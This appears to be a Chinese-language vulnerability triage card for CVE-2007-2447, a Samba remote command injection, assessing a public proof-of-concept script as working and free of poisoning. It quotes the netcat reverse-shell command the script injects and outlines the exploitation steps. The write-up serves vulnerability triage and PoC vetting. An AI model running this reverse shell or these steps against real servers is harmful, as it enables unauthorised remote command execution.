## CVE-2007-2447-Samba-远程命令注入

**漏洞编号:** CVE-2007-2447

**漏洞类型:** 远程命令注入

**影响应用:** Samba

**危害等级:** 高危，允许远程攻击者执行任意命令

**影响版本:** 3.0.0 through 3.0.25rc3

**利用条件:** 需要目标系统运行受影响的Samba版本，并且启用'username map script'配置(对于SamrChangePassword函数)或者能够进行远程身份验证(对于其他MS-RPC函数，如远程打印机和文件共享管理)。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2007-2447 存在于 Samba 的 MS-RPC 功能中。在 'username map script' 启用的情况下，未经身份验证的远程攻击者可以通过 SamrChangePassword 函数利用此漏洞执行任意命令。经过身份验证的远程用户也可以通过其他 MS-RPC 函数（如远程打印机和文件共享管理）利用此漏洞。

**漏洞利用有效性分析：**

根据漏洞信息和搜索结果，此漏洞允许远程攻击者执行任意命令。提供的 POC 代码 `samba_usermap.py` 尝试利用此漏洞获得反向 shell。它通过 SMB 协议连接到目标主机，并发送包含 shell 元字符的用户名，从而触发命令注入。该POC使用`nohup nc -e /bin/bash {} {} &`指令，该指令尝试在目标机器上执行一个反向shell到攻击者的监听器。综上所述，提供的POC代码是有效的。

**投毒风险分析：**

查看提供的`samba_usermap.py`代码，未发现明显的恶意代码或后门。该脚本的核心功能是利用漏洞执行命令。`nohup nc -e /bin/bash {} {} &` 这段代码是漏洞利用的一部分，不是投毒行为。

**漏洞利用方式：**

1.  攻击者需要一个运行着受影响 Samba 版本的服务器。
2.  如果利用 `SamrChangePassword` 函数，目标服务器的 `smb.conf` 文件需要启用 `username map script` 选项。
3.  攻击者使用 `samba_usermap.py` 脚本，提供攻击机和目标机器的 IP 地址和端口。
4.  脚本构造包含 shell 元字符的用户名，并通过 SMB 协议连接到目标服务器。
5.  Samba 服务器在处理用户名时，由于未正确转义 shell 元字符，导致命令注入。
6.  攻击者通过 netcat 监听指定端口，接收目标服务器的反向 shell。

**项目地址:** [MikeRega7/CVE-2007-2447-RCE](https://github.com/MikeRega7/CVE-2007-2447-RCE)

**漏洞详情:** [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)